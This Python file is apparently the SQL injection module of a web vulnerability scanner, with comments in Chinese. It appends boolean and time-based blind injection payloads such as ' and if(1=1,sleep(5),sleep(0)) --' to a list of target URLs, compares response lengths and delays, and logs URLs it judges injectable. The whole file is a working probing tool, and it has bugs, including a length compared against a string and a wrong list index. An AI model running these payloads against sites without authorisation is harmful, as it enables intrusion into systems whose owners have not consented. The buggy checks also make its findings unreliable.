#encoding = utf-8
"""
@Sqli检测
@Author: c0d3r1iu
@Email: admin@recorday.cn
@File: sqli.py
@Time: 2019/2/15 13:58
"""
import requests
import time
# import mysql
import base64


class Sqli:

    payload = [" and 1=1", " and 1=2", "' and '1'='1", "' and '1'='2", " and if(1=1,sleep(5),sleep(0)) --", "' and if(1=1,sleep(5),sleep(0)) --"]
    #payload = [" and sleep(5) #", "' and sleep(5) #"]
    url_list = []
    secont_url_list = []
    db = ''
    headers = {'User-Agent': 'Mozilla/4.0'}
    int_vul = 0
    str_vul = 0

    def __init__(self, url_list):
        print('[o] sqli模块初始化中...')
        # self.db = mysql.Mysqldb()
        self.url_list = url_list

    def check_delay(self, url, payload_num):
        payload = url + self.payload[payload_num]
        print('[*] 当前payload',payload)
        try:
            First_time = time.time()
            response1 = requests.get(payload, headers=self.headers, timeout=20)
            Delay = time.time() - First_time
            print('[*]delay :',Delay,' second')
            return Delay
        except Exception:
            return 0

    def check_inject(self):
        print('=========== [!!] Start and inject url test ================')
        for url in self.url_list:
            try:
                print('[+] 访问 '+url+ ' 测试注入中，还有' + str(len(self.url_list)-self.url_list.index(url)) +'个任务')
                exploit0 = url
                exploit1 = url + self.payload[0]
                exploit2 = url + self.payload[1]
                exploit3 = url + self.payload[2]
                exploit4 = url + self.payload[3]
                request0 = requests.get(exploit0, timeout=20).text
                request1 = requests.get(exploit1, timeout=20).text
                request2 = requests.get(exploit2, timeout=20).text
                request3 = requests.get(exploit3, timeout=20).text
                request4 = requests.get(exploit4, timeout=20).text

                if len(request1) == len(request0) and request2 != request0:
                    print('[+] 发现数字型注入点：',url)
                    self.secont_url_list.append(url)
                if len(request3) == request0 and request4 != request0:
                    print('[+] 发现字符型注入点：', url)
                    self.secont_url_list.append(url)
            except Exception:
                print('[x] 测试失败')
                continue
        self.check_delay_inject()

    def check_delay_inject(self):

        print('=========== [!!] Start time-based blind inject test ================')
        print('Target_list:',self.secont_url_list)
        for url in self.secont_url_list:
            try:
                print('[+] 访问 '+url+ ' 测试注入中，还有' + str(len(self.url_list)-self.url_list.index(url)) +'个任务')
                for i in range(3):
                    delay_int = self.check_delay(url, 4)
                    print('数字型注入延迟:',delay_int)
                    delay_str = self.check_delay(url, 5)
                    print('字符型注入延迟:', delay_str)
                    if delay_int >= 5 and delay_int < 6.5:
                        self.int_vul += 1
                    elif delay_int <= 4.5:
                        self.int_vul -= 1
                    # if delay_int > 7:
                    #     self.int_vul -= 4
                    if delay_str >= 5 and delay_str < 6.5:
                        self.str_vul += 1
                    elif delay_str <= 4.5:
                        self.str_vul -= 1
                    # elif delay_str <= 3:
                    #     self.str_vul -= 3
                    # if delay_str > 7:
                    #     self.str_vul -= 4
            except Exception:
                print('[x] 测试失败')

            try:
                if self.int_vul == 3:
                    print('[!] 发现数字型注入点: ' + url)
                    files = open('sqli_test.txt', 'a')
                    files.write(url + '\n')
                    files.close()
                elif self.int_vul == 1:
                    pass
                else:
                    print('[x] 未发现数字型注入点')
                self.int_vul = 0
                if self.str_vul == 3:
                    print('[!] 发现字符型注入点: ' + url)
                    files = open('sqli_test.txt', 'a')
                    files.write(url + '\n')
                    files.close()
                elif self.str_vul == 1:
                    pass
                else:
                    print('[x] 未发现字符型注入点')
                self.str_vul = 0
            except Exception:
                print('[x] 写入URL失败')

    def check_error_inject(self):
        print('=========== [!!] Start error-based inject test ================')
        print('Target_list:', self.secont_url_list)

